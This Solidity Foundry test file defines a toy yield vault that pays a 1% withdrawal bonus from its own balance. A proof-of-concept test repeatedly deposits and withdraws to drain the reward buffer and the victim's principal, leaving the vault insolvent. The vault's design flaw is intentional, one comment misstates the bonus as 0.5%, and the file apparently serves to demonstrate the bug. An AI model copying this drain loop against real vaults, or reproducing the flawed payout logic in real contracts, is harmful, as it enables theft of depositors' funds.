// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IYieldVault {
    function deposit() external payable;
    function withdraw() external;
    function principal(address) external view returns (uint256);
    function totalPrincipal() external view returns (uint256);
}

contract YieldVault {
    mapping(address => uint256) public principal;
    uint256 public totalPrincipal;

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount, uint256 bonus);

    constructor() payable {}

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        principal[msg.sender] += msg.value;
        totalPrincipal += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 p = principal[msg.sender];
        require(p > 0, "nothing to withdraw");
        principal[msg.sender] = 0;
        totalPrincipal -= p;
        uint256 bonus = p / 100;
        (bool ok, ) = msg.sender.call{value: p + bonus}("");
        require(ok, "transfer failed");
        emit Withdraw(msg.sender, p, bonus);
    }

    function totalAssets() external view returns (uint256) {
        return address(this).balance;
    }
}

/// The bonus is paid out of the seeded buffer only in theory. In reality the
/// payout of `p + p/100` comes straight out of the contract balance, so any
/// user can deposit/withdraw in a loop, pocket 1% each round, drain the buffer
/// and then eat the principal of the other depositor.
contract YieldVaultDrainTest is Test {
    YieldVault vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint256 constant BUFFER = 1 ether;   // seeded reward buffer at deploy
    uint256 constant STAKE = 50 ether;   // attacker's per-cycle deposit
    uint256 constant VICTIM_DEP = 100 ether;

    function setUp() public {
        vault = new YieldVault{value: BUFFER}();
        vm.deal(attacker, 200 ether);
        vm.deal(victim, VICTIM_DEP);

        // Honest user puts in real money.
        vm.prank(victim);
        vault.deposit{value: VICTIM_DEP}();

        assertEq(address(vault).balance, BUFFER + VICTIM_DEP);
        assertEq(vault.totalPrincipal(), VICTIM_DEP);
    }

    function testAttackerDrainsBufferAndBreaksSolvency() public {
        uint256 start = attacker.balance;

        // 20 deposit/withdraw cycles. Each cycle the attacker gets 1% bonus
        // (0.5 ETH) that was never actually earned by the vault.
        for (uint256 i = 0; i < 20; i++) {
            vm.startPrank(attacker);
            vault.deposit{value: STAKE}();
            vault.withdraw();
            vm.stopPrank();
        }

        uint256 profit = attacker.balance - start;
        emit log_named_decimal_uint("attacker profit (ETH)", profit, 18);
        emit log_named_decimal_uint("vault balance (ETH)", address(vault).balance, 18);
        emit log_named_decimal_uint("owed to users (ETH)", vault.totalPrincipal(), 18);

        // Attacker is up a full 10 ETH (= 20 * 0.5% of 50 ETH).
        assertEq(profit, 10 ether);
        // Attacker is made whole and keeps the loot.
        assertEq(vault.principal(attacker), 0);

        // The vault holds LESS than the principal it owes: it is insolvent.
        assertLt(address(vault).balance, vault.totalPrincipal());

        // The victim's money is now partly gone and the victim is locked out:
        // a 100 ETH payout cannot be honoured from 91 ETH, so withdraw reverts.
        vm.prank(victim);
        vm.expectRevert("transfer failed");
        vault.withdraw();

        emit log_string("victim can no longer withdraw 100 ETH - funds stuck");
    }
}

